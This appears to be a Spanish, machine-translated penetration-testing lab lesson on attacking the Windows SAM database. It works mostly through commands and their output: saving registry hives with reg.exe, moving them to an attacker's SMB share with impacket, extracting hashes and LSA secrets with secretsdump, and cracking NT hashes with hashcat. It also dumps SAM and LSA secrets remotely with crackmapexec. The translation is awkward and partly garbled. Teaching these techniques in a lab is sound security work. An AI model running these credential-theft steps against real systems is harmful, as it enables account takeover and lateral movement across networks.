# Atacando a Sam

Con el acceso a un sistema de Windows no unido a un dominio, podemos beneficiarnos al intentar volcar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a agrietarse sin hash. Hacer esto fuera de línea asegurará que podamos continuar intentando nuestros ataques sin mantener una sesión activa con un objetivo. Caminemos juntos este proceso utilizando un host objetivo. Siéntase libre de seguir al generar el cuadro objetivo en esta sección.

### **Copiar colmenas de Registro Sam**

Hay tres colmenas de registro que podemos copiar si tenemos acceso de administrador local en el objetivo; Cada uno tendrá un propósito específico cuando lleguemos a verter y romper los hashes. Aquí hay una breve descripción de cada uno en la tabla a continuación:

| **Registro Hive** | **Descripción** |
| --- | --- |
| `hklm\sam` | Contiene los hashes asociados con las contraseñas de la cuenta local. Necesitaremos los hash para que podamos descifrarlos y obtener las contraseñas de la cuenta de usuario en ClearText. |
| `hklm\system` | Contiene el sistema de inicio del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de entrada para descifrar la base de datos SAM. |
| `hklm\security` | Contiene credenciales almacenados en caché para cuentas de dominio. Podemos beneficiarnos de tener esto en un objetivo de Windows unido por dominio. |

Podemos crear copias de seguridad de estas colmenas usando el`reg.exe`utilidad.

### **Uso de Reg.exe Guardar para copiar colmenas de registro**

El lanzamiento de CMD como administrador nos permitirá ejecutar Reg.exe para guardar copias de las colmenas del registro antes mencionadas. Ejecute estos comandos a continuación para hacerlo:

Atacando a Sam

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.

```

Técnicamente solo necesitaremos`hklm\sam` & `hklm\system`, pero`hklm\security`También puede ser útil para ahorrar, ya que puede contener hashes asociados con credenciales de cuenta de usuario de dominio en caché presentes en hosts unidos por dominio. Una vez que las colmenas se guardan fuera de línea, podemos usar varios métodos para transferirlos a nuestro host de ataque. En este caso, usemos[Impacket smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)En combinación con algunos comandos CMD útiles para mover las copias de la colmena a una acción creada en nuestro host de ataque.

### **Creación de una compartir con smbserver.py**

Todo lo que debemos hacer para crear el share es ejecutar smbserver.py -smb2support usando python, darle un nombre a compartir (`CompData`) y especifique el directorio en nuestro host de ataque donde la participación almacenará las copias de la colmena (`/home/ltnbob/Documents`). Saber que el`smb2support`La opción asegurará que se admitan versiones más nuevas de SMB. Si no usamos este indicador, habrá errores cuando se conectará desde el objetivo de Windows al compartir alojado en nuestro host de ataque. Las versiones más nuevas de Windows no admiten SMBV1 de forma predeterminada debido a la[numerosos vulnerabilitas severos](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1)y exploits disponibles públicamente.

Atacando a Sam

```
xnoxos@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Una vez que tenemos la parte de la participación en nuestro host de ataque, podemos usar el`move`Comando en el objetivo de Windows para mover las copias de la colmena a la acción.

### **Mover copias de colmena para compartir**

Atacando a Sam

```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.

```

Luego podemos confirmar que nuestras copias de la colmena se trasladaron con éxito a la acción navegando al directorio compartido en nuestro host de ataque y usando`ls`Para enumerar los archivos.

### **Confirmando copias de colmena transferidas para atacar al anfitrión**

Atacando a Sam

```
xnoxos@htb[/htb]$ lssam.save  security.save  system.save

```

---

# **Dumping Hashes con Secretsdump.py de Impacket**

Una herramienta increíblemente útil que podemos usar para volcar los hashes fuera de línea es`secretsdump.py`. Se puede encontrar un impacket en la mayoría de las distribuciones de pruebas de penetración modernas. Podemos verificarlo usando`locate`En un sistema basado en Linux:

### **Localización de secretsdump.py**

Atacando a Sam

```
xnoxos@htb[/htb]$ locate secretsdump
```

Usar secretsdump.py es un proceso simple. Todo lo que debemos hacer es ejecutar secretsdump.py usando python, luego especificar cada archivo de colmena que recuperamos del host de destino.

### **Ejecutando secretsdump.py**

Atacando a Sam

```
xnoxos@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCALImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM  0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42[*] Cleaning up...

```

Aquí vemos que SecretSdump descarta con éxito el`local`Sam Hashes y también habría arrojado la información de inicio de sesión del dominio en caché si el objetivo se uniera al dominio y hubiera almacenado en caché las credenciales presentes en la seguridad HKLM. Observe el primer paso que se ejecuta SecretSdump es apuntar a la`system bootkey`antes de proceder a volcar el`LOCAL SAM hashes`. No puede volcar esos hashes sin la tecla de arranque porque esa clave de arranque se usa para cifrar y descifrar la base de datos SAM, por lo que es importante que tengamos copias de las colmenas del registro que discutimos anteriormente en esta sección. Observe en la parte superior de la salida secretsdump.py:

Atacando a Sam

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)

```

Esto nos dice cómo leer la salida y qué hashes podemos descifrar. La mayoría de los sistemas operativos modernos de Windows almacenan la contraseña como un hash NT. Los sistemas operativos más antiguos que Windows Vista y Windows Server 2008 almacenan contraseñas como un hash LM, por lo que solo podemos beneficiarnos al descifrarlas si nuestro objetivo es un sistema operativo Windows más antiguo.

Sabiendo esto, podemos copiar los hashes NT asociados con cada cuenta de usuario en un archivo de texto y comenzar a descifrar contraseñas. Puede ser beneficioso tomar una nota de cada usuario, por lo que sabemos qué contraseña está asociada con qué cuenta de usuario.

---

# **Grietas de hashes con hashcat**

Una vez que tenemos los hashes, podemos comenzar a intentar descifrarlos usando[Hashcat](https://hashcat.net/hashcat/). Lo usaremos para intentar romper los hashes que hemos reunido. Si echamos un vistazo al sitio web hashcat, notaremos el soporte para una amplia gama de algoritmos de hash. En este módulo, usamos hashcat para casos de uso específicos. Esto debería ayudarnos a desarrollar la mentalidad y la comprensión para usar el hashcat y saber cuándo necesitamos hacer referencia a la documentación de Hashcat para comprender qué modo y opciones necesitamos usar dependiendo de los hashes que capturamos.

Como se mencionó anteriormente, podemos completar un archivo de texto con los hashes NT que pudimos volcar.

### **Agregar nthashes a un archivo .txt**

Atacando a Sam

```
xnoxos@htb[/htb]$ sudo vim hashestocrack.txt64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2

```

Ahora que los hashes nt están en nuestro archivo de texto (`hashestocrack.txt`), podemos usar hashcat para descifrarlos.

### **Correr hashcat contra NT Hashes**

Hashcat tiene muchos modos diferentes que podemos usar. Seleccionar un modo depende en gran medida del tipo de ataque y el tipo hash que queremos descifrar. Cubrir cada modo está más allá del alcance de este módulo. Nos centraremos en usar`-m`Para seleccionar el tipo hash`1000`para descifrar nuestros hashes NT (también denominados hash basados en NTLM). Podemos referirnos a los hashcat[Wiki Página](https://hashcat.net/wiki/doku.php?id=example_hashes)o la página del hombre para ver los tipos hash compatibles y su número asociado. Usaremos la infame lista de palabras rockyou.txt mencionada en el`Credential Storage`sección de este módulo.

Atacando a Sam

```
xnoxos@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
31d6cfe0d16ae931b73c59d7e0c089c0:

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: newzealand -> whitetigerStarted: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021

```

Podemos ver en la salida que hashcat usó un tipo de ataque llamado[ataque del diccionario](https://en.wikipedia.org/wiki/Dictionary_attack)Para adivinar rápidamente las contraseñas que utilizan una lista de contraseñas conocidas (Rockyou.txt) y tuvo éxito en descifrar 3 de los hashes. Tener las contraseñas podría ser útiles para nosotros de muchas maneras. Podríamos intentar usar las contraseñas que rompimos para acceder a otros sistemas en la red. Es muy común que las personas reutilicen contraseñas en diferentes cuentas laborales y personales. Conociendo esta técnica, cubrimos puede ser útil en los compromisos. Nos beneficiaremos de usar esto cada vez que nos encontremos con un sistema de Windows vulnerable y obtenemos derechos de administración para descargar la base de datos SAM.

Tenga en cuenta que esta es una técnica bien conocida, por lo que los administradores pueden tener salvaguardas para prevenirla y detectarla. Podemos ver algunas de estas formas[documentado](https://attack.mitre.org/techniques/T1003/002/)Dentro del marco de ataque de Mitre.

---

# **Dumping remoto y consideraciones de secretos de LSA**

Con acceso a credenciales con`local admin privileges`, también es posible que nos dirijamos los secretos de LSA a través de la red. Esto podría permitirnos extraer credenciales de un servicio en ejecución, tarea programada o aplicación que utiliza secretos de LSA para almacenar contraseñas.

### **Dumping LSA Secrets de forma remota**

Atacando a Sam

```
xnoxos@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsaSMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488bSMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached

```

### **Dumping Sam de forma remota**

También podemos volcar hash de la base de datos SAM de forma remota.

Atacando a Sam

```
xnoxos@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --samSMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```